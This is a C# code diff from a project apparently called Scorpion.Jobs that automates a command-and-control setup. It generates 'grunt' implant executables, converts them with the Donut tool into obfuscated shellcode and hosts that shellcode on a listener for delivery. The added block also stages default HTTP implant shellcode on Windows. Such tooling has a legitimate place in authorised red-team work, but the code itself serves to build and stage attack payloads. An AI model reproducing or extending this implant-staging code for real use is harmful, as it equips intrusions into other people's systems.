@@ -63,6 +63,19 @@ namespace Scorpion.Jobs
 
       var nugetExePath = DownloadNugetExe(dataDir);
       var donutExePath = DownloadDonutExe(dataDir);
+      if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
+        var shellcodePath = RunDonutForGrunt("default", dataDir, donutExePath);
+        var shellcodeUrl = "/default.bin";
+        Console.WriteLine($"Hosting default http binary shellcode (donut) at path {shellcodeUrl}");
+        var hostedShellcode = new HostedFile();
+        hostedShellcode.ListenerId = listener.Id;
+        hostedShellcode.Path = shellcodeUrl;
+        hostedShellcode.Content = Convert.ToBase64String(File.ReadAllBytes(shellcodePath));
+        hostedShellcode = await request.CreateHostedFile((int)listener.Id, hostedShellcode);
+      } else {
+        // Could dynamically ddownload linux donut binary and still run this technically
+        Console.Write("Not generating shellcode for default grunt because not on windows.");
+      }
 
       for (int i = 0; i < smbGruntCount; i++) {
         var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
@@ -137,9 +150,10 @@ namespace Scorpion.Jobs
           hostedBin = await request.CreateHostedFile((int)listener.Id, hostedBin);
           Console.WriteLine($"Grunt generation complete for {aGuid}");
 
+          // Was added to fix error but locking wasn't the issue, can remove
           WaitForAvailable(Path.Join(dataDir, aGuid + ".exe"));
 
-          var shellcodePath = RunDonutForGrunt(aGuid, projDir, dataDir, donutExePath);
+          var shellcodePath = RunDonutForGrunt(aGuid, dataDir, donutExePath);
           var shellcodeUrl = "/" + aGuid + ".bin";
           Console.WriteLine($"Hosting obfuscated shellcode (donut) smb binary at path {shellcodeUrl}");
           var hostedShellcode = new HostedFile();
@@ -160,7 +174,7 @@ namespace Scorpion.Jobs
 
       return await Task.FromResult(0);
     }
-    public string RunDonutForGrunt(string aGuid, string projDir, string dataDir, string donutExePath)
+    public string RunDonutForGrunt(string aGuid, string dataDir, string donutExePath)
     {
       var source = Path.Join(dataDir, aGuid + ".exe");
       var gruntShellcodePath = Path.Join(dataDir, aGuid + ".bin");
@@ -175,7 +189,7 @@ namespace Scorpion.Jobs
       // Redirect the output stream of the child process.
       startInfo.UseShellExecute = false;
       startInfo.RedirectStandardOutput = true;
-      startInfo.WorkingDirectory = projDir;
+      startInfo.WorkingDirectory = dataDir;
       startInfo.FileName = donutExePath;
       startInfo.Arguments = args;
       donut.StartInfo = startInfo;
